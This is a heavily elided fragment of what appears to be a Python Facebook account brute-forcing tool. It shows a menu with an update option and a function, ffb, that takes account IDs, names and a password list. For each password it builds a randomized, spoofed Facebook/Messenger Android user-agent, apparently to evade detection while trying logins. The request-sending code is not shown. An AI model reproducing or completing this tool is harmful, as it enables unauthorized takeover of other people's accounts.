...
def YUJI():   
    ...
    try:
                ...
                if x == ("***"):
                        ...
                        print('[2] UPDATE TOOL (CLICK THIS OPTION IF YOU WANT TO UPDATE THE SCRIPT) ')
                        print('[0] EXIT ')
                        linex()
...
def ffb(ids,names,passlist):
        try:
                ...
                for pw in passlist:
                        ...
                        ua  = "[FBAN/FB4A;FBAV/"+str(random.randrange(70,400))+".0.0."+str(random.randrange(10,77))+"."+str(random.randrange(40,200))+";[FBAN/Orca-Android;FBAV/"+str(random.randrange(70,400))+".0.0."+str(random.randrange(10,77))+"."+str(random.randrange(40,200))+";FBPN/com.facebook.orca;FBLC/en_PH;FBBV/396116327;FBCR/TNT;FBMF/Infinix;FBBD/Infinix;FBDV/Infinix X559;FBSV/12;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1444};FB_FW/1;]"
